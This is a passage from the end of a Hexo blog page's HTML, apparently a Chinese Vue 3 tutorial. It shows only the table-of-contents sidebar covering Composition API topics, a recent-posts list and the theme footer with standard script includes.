href="#8-1-2-1-%E6%80%A7%E8%83%BD%E7%9A%84%E6%8F%90%E5%8D%87"><span class="toc-number">9.1.2.1.</span> <span class="toc-text">8.1.2.1.性能的提升</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-1-2-2-%E6%BA%90%E7%A0%81%E7%9A%84%E5%8D%87%E7%BA%A7"><span class="toc-number">9.1.2.2.</span> <span class="toc-text">8.1.2.2.源码的升级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-1-2-3-%E6%8B%A5%E6%8A%B1TypeScript"><span class="toc-number">9.1.2.3.</span> <span class="toc-text">8.1.2.3.拥抱TypeScript</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-1-2-4-%E6%96%B0%E7%89%B9%E6%80%A7"><span class="toc-number">9.1.2.4.</span> <span class="toc-text">8.1.2.4.新特性</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-2-%E5%88%9B%E5%BB%BAVue3%E5%B7%A5%E7%A8%8B"><span class="toc-number">9.2.</span> <span class="toc-text">8.2.创建Vue3工程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-1-%E4%BD%BF%E7%94%A8vue-cli%E5%88%9B%E5%BB%BA"><span class="toc-number">9.2.1.</span> <span class="toc-text">8.2.1.使用vue-cli创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-2-%E4%BD%BF%E7%94%A8vite%E5%88%9B%E5%BB%BA"><span class="toc-number">9.2.2.</span> <span class="toc-text">8.2.2.使用vite创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-3-%E5%88%86%E6%9E%90%E5%B7%A5%E7%A8%8B%E7%BB%93%E6%9E%84"><span class="toc-number">9.2.3.</span> <span class="toc-text">8.2.3.分析工程结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#src-main-js"><span class="toc-number">9.2.3.1.</span> <span class="toc-text">src&#x2F;main.js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#App-vue-1"><span class="toc-number">9.2.3.2.</span> <span class="toc-text">App.vue</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-4-%E5%AE%89%E8%A3%85vue3%E5%AF%B9%E5%BA%94%E7%9A%84%E5%BC%80%E5%8F%91%E8%80%85%E5%B7%A5%E5%85%B7"><span class="toc-number">9.2.4.</span> <span class="toc-text">8.2.4.安装vue3对应的开发者工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-3-%E5%B8%B8%E7%94%A8Composition-API"><span class="toc-number">9.3.</span> <span class="toc-text">8.3.常用Composition API</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-1-%E6%8B%89%E5%BC%80%E5%BA%8F%E5%B9%95%E7%9A%84setup"><span class="toc-number">9.3.1.</span> <span class="toc-text">8.3.1.拉开序幕的setup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-2-ref%E5%87%BD%E6%95%B0"><span class="toc-number">9.3.2.</span> <span class="toc-text">8.3.2.ref函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-2-1ref%E5%87%BD%E6%95%B0%E5%A4%84%E7%90%86%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">9.3.2.1.</span> <span class="toc-text">8.3.2.1ref函数处理基本数据类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-2-2-ref%E5%87%BD%E6%95%B0%E5%A4%84%E7%90%86%E5%AF%B9%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">9.3.2.2.</span> <span class="toc-text">8.3.2.2.ref函数处理对象数据类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-2-3-%E5%B0%8F%E7%BB%93%EF%BC%9Aref%E5%87%BD%E6%95%B0"><span class="toc-number">9.3.2.3.</span> <span class="toc-text">8.3.2.3.小结：ref函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-3-reactive%E5%87%BD%E6%95%B0"><span class="toc-number">9.3.3.</span> <span class="toc-text">8.3.3.reactive函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-3-1-%E8%BF%94%E5%9B%9E%E7%9A%84%E6%98%AFProxy%E5%AF%B9%E8%B1%A1"><span class="toc-number">9.3.3.1.</span> <span class="toc-text">8.3.3.1.返回的是Proxy对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-3-2-%E4%BF%AE%E6%94%B9%E5%AF%B9%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">9.3.3.2.</span> <span class="toc-text">8.3.3.2.修改对象数据类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-3-3-%E4%BF%AE%E6%94%B9%E5%B5%8C%E5%A5%97%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%95%B0%E6%8D%AE"><span class="toc-number">9.3.3.3.</span> <span class="toc-text">8.3.3.3.修改嵌套的对象数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-3-4-%E4%BF%AE%E6%94%B9%E6%95%B0%E7%BB%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">9.3.3.4.</span> <span class="toc-text">8.3.3.4.修改数组数据类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93%EF%BC%9Areactive%E5%87%BD%E6%95%B0"><span class="toc-number">9.3.3.5.</span> <span class="toc-text">小结：reactive函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-4-Vue3%E4%B8%AD%E7%9A%84%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86"><span class="toc-number">9.3.4.</span> <span class="toc-text">8.3.4.Vue3中的响应式原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-4-1-Vue2%E7%9A%84%E5%93%8D%E5%BA%94%E5%BC%8F"><span class="toc-number">9.3.4.1.</span> <span class="toc-text">8.3.4.1.Vue2的响应式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-4-2-Vue3%E7%9A%84%E5%93%8D%E5%BA%94%E5%BC%8F"><span class="toc-number">9.3.4.2.</span> <span class="toc-text">8.3.4.2.Vue3的响应式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-5-reactive%E5%AF%B9%E6%AF%94ref"><span class="toc-number">9.3.5.</span> <span class="toc-text">8.3.5.reactive对比ref</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-6-setup%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">9.3.6.</span> <span class="toc-text">8.3.6.setup的两个注意点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-6-1-setup%E6%89%A7%E8%A1%8C%E7%9A%84%E6%97%B6%E6%9C%BA"><span class="toc-number">9.3.6.1.</span> <span class="toc-text">8.3.6.1.setup执行的时机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-6-2-setup%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">9.3.6.2.</span> <span class="toc-text">8.3.6.2.setup的参数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E9%AA%8C%E8%AF%81"><span class="toc-number">9.3.6.2.1.</span> <span class="toc-text">参数验证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#props%E5%8F%82%E6%95%B0"><span class="toc-number">9.3.6.2.2.</span> <span class="toc-text">props参数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#context%E5%8F%82%E6%95%B0"><span class="toc-number">9.3.6.2.3.</span> <span class="toc-text">context参数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93%EF%BC%9Asetup%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">9.3.6.3.</span> <span class="toc-text">小结：setup的两个注意点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-7-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E4%B8%8E%E7%9B%91%E8%A7%86"><span class="toc-number">9.3.7.</span> <span class="toc-text">8.3.7.计算属性与监视</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-7-1-computed%E5%87%BD%E6%95%B0"><span class="toc-number">9.3.7.1.</span> <span class="toc-text">8.3.7.1.computed函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-7-2-watch%E5%87%BD%E6%95%B0"><span class="toc-number">9.3.7.2.</span> <span class="toc-text">8.3.7.2.watch函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-3-7-3-watchEffect%E5%87%BD%E6%95%B0"><span class="toc-number">9.3.7.3.</span> <span class="toc-text">8.3.7.3.watchEffect函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-8-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">9.3.8.</span> <span class="toc-text">8.3.8.生命周期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-9-%E8%87%AA%E5%AE%9A%E4%B9%89hook%E5%87%BD%E6%95%B0"><span class="toc-number">9.3.9.</span> <span class="toc-text">8.3.9.自定义hook函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-10-toRef"><span class="toc-number">9.3.10.</span> <span class="toc-text">8.3.10.toRef</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-4-%E5%85%B6%E5%AE%83Composition-API"><span class="toc-number">9.4.</span> <span class="toc-text">8.4.其它Composition API</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-4-1-shallowReactive%E5%92%8CshallowRef"><span class="toc-number">9.4.1.</span> <span class="toc-text">8.4.1.shallowReactive和shallowRef</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-4-2-readonly%E4%B8%8EshallowReadonly"><span class="toc-number">9.4.2.</span> <span class="toc-text">8.4.2.readonly与shallowReadonly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-4-3-toRaw%E4%B8%8EmarkRaw"><span class="toc-number">9.4.3.</span> <span class="toc-text">8.4.3.toRaw与markRaw</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-4-4-customRef"><span class="toc-number">9.4.4.</span> <span class="toc-text">8.4.4.customRef</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-4-5-provide%E4%B8%8Einject"><span class="toc-number">9.4.5.</span> <span class="toc-text">8.4.5.provide与inject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-4-6-%E5%93%8D%E5%BA%94%E5%BC%8F%E6%95%B0%E6%8D%AE%E7%9A%84%E5%88%A4%E6%96%AD"><span class="toc-number">9.4.6.</span> <span class="toc-text">8.4.6.响应式数据的判断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-5-Composition-API%E7%9A%84%E4%BC%98%E5%8A%BF"><span class="toc-number">9.5.</span> <span class="toc-text">8.5.Composition API的优势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-5-1-Options-API%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">9.5.1.</span> <span class="toc-text">8.5.1.Options API存在的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-5-2-Composition-API%E7%9A%84%E4%BC%98%E5%8A%BF"><span class="toc-number">9.5.2.</span> <span class="toc-text">8.5.2.Composition API的优势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-6-%E6%96%B0%E7%9A%84%E7%BB%84%E4%BB%B6"><span class="toc-number">9.6.</span> <span class="toc-text">8.6.新的组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-6-1-Fragment"><span class="toc-number">9.6.1.</span> <span class="toc-text">8.6.1.Fragment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-6-2-Teleport"><span class="toc-number">9.6.2.</span> <span class="toc-text">8.6.2.Teleport</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-6-3-Suspense"><span class="toc-number">9.6.3.</span> <span class="toc-text">8.6.3.Suspense</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-7-%E5%85%B6%E4%BB%96"><span class="toc-number">9.7.</span> <span class="toc-text">8.7.其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-7-1-%E5%85%A8%E5%B1%80API%E7%9A%84%E8%BD%AC%E7%A7%BB"><span class="toc-number">9.7.1.</span> <span class="toc-text">8.7.1.全局API的转移</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-7-2-%E5%85%B6%E4%BB%96%E6%94%B9%E5%8F%98"><span class="toc-number">9.8.</span> <span class="toc-text">8.7.2.其他改变</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/07/31/web/Node/koa_EN/" title="Koa2 build API service">Koa2 build API service</a><time datetime="2022-07-31T15:52:13.000Z" title="发表于 2022-07-31 23:52:13">2022-07-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/07/25/web/JavaScript/web%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%9B%E9%98%B6/" title="web基础及进阶">web基础及进阶</a><time datetime="2022-07-25T15:52:13.000Z" title="发表于 2022-07-25 23:52:13">2022-07-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/07/25/web/Node/koa/" title="Koa2搭建API服务">Koa2搭建API服务</a><time datetime="2022-07-25T15:52:13.000Z" title="发表于 2022-07-25 23:52:13">2022-07-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/07/25/web/%E5%85%B6%E4%BB%96/%E8%BF%90%E7%BB%B4/Neovim/%E3%80%8ANeovim%20%E9%85%8D%E7%BD%AE%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E0%E5%88%B01%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84IDE%E3%80%8B/" title="Neovim 配置实战：从0到1打造自己的IDE">Neovim 配置实战：从0到1打造自己的IDE</a><time datetime="2022-07-25T12:34:51.000Z" title="发表于 2022-07-25 20:34:51">2022-07-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/" title="Vue基本使用">Vue基本使用</a><time datetime="2022-07-25T12:30:40.000Z" title="发表于 2022-07-25 20:30:40">2022-07-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Sai</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://saiable.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>